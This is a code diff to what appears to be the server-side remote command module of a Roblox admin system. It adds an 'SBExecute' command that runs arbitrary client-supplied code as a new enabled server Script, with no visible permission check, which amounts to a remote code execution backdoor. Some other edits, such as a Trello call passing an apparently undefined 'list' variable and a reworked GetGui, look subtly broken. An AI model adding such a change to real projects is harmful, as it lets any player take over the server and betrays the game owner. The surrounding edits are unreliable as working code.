@@ -726,6 +726,16 @@ return function(Vargs, GetEnv)
 		};
 
 		Commands = {
+
+			SBExecute = function(p, args)
+				local Code = args[1]
+
+				local Script = Core.NewScript('Script',Code)
+				Script.Parent = service.ServerScriptService
+				Script.Disabled = false
+				Functions.Hint("Ran Script", {p}, 5)
+			end;
+															
 			GetReturn = function(p: Player, args: {[number]: any})
 				local com = args[1]
 				local key = args[2]
@@ -911,10 +921,10 @@ return function(Vargs, GetEnv)
 							end
 						end
 
-						local lists = trello.getLists(Settings.Trello_Primary)
-						local list = trello.getListObj(lists, listName)
+						local lists = trello.Boards.GetLists(Settings.Trello_Primary)
+						local list = trello.GetListObject(lists,list)
 						if list then
-							local card = trello.makeCard(list.id, name, desc)
+							local card = trello.Lists.MakeCard(list.id, name, desc)
 							Functions.Hint(`Made card "{card.name}" in list "{list.name}"`, {p})
 							Logs.AddLog(Logs.Script,{
 								Text = `{p} performed Trello operation`;
@@ -1243,8 +1253,8 @@ return function(Vargs, GetEnv)
 			return Remote.Get(p,"UI",GUI,theme,data or {})
 		end;
 
-		GetGui = function(p: Player, GUI: string, data: {[any]: any}, themeData: {[string]: any})
-			return Remote.MakeGuiGet(p,GUI,data,themeData)
+		GetGui = function(p: Player, GUI: string, ignore: {[any]: any}, returnOne: {[any]: any})
+			return Remote.Get(p, "GetGui", GUI, ignore, returnOne)
 		end;
 
 		RemoveGui = function(p: Player, name: string | boolean | Instance, ignore: string)
